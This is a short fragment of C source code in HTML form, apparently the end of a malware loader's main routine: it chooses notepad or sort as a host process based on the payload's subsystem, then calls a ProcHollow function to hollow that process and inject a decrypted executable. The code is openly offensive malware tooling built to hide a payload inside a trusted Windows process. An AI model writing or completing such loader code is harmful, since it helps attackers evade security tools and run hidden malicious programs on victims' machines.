//&nbsp;determine&nbsp;process&nbsp;to&nbsp;inject&nbsp;into&nbsp;based&nbsp;on&nbsp;subsystem<br />	extracted_pe_subsystem&nbsp;=&nbsp;GetSubsystem(extracted_pe);<br /><br />	if&nbsp;(extracted_pe_subsystem&nbsp;==&nbsp;IMAGE_SUBSYSTEM_WINDOWS_GUI)<br />		strcpy_s(target_process,&nbsp;MAX_PATH,&nbsp;&quot;notepad&quot;);<br />	else&nbsp;if&nbsp;(extracted_pe_subsystem&nbsp;==&nbsp;IMAGE_SUBSYSTEM_WINDOWS_CUI)<br />		strcpy_s(target_process,&nbsp;MAX_PATH,&nbsp;&quot;sort&quot;);<br />	else<br />	{<br />		printf(&quot;[-]&nbsp;subsystem&nbsp;not&nbsp;recognised&nbsp;\n[*]&nbsp;exiting...&quot;);<br />		return&nbsp;EXIT_FAILURE;<br />	}<br /><br />	printf(&quot;[*]&nbsp;hollowing&nbsp;target&nbsp;process&nbsp;and&nbsp;injecting&nbsp;decrypted&nbsp;PE...&nbsp;\n&quot;);<br />	<br />	//&nbsp;the&nbsp;subsystem&nbsp;provided&nbsp;here&nbsp;should&nbsp;be&nbsp;that&nbsp;of&nbsp;the&nbsp;target&nbsp;process.&nbsp;<br />	//&nbsp;i&nbsp;don&#39;t&nbsp;know&nbsp;where&nbsp;to&nbsp;get&nbsp;that&nbsp;atm&nbsp;(without&nbsp;loading&nbsp;the&nbsp;target&nbsp;process&nbsp;into&nbsp;meomry&nbsp;and&nbsp;reading&nbsp;its&nbsp;pe&nbsp;header,&nbsp;which&nbsp;seems&nbsp;excessive)<br />	ProcHollow(extracted_pe,&nbsp;target_process,&nbsp;extracted_pe_subsystem);<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /></div>
</body>
</html>
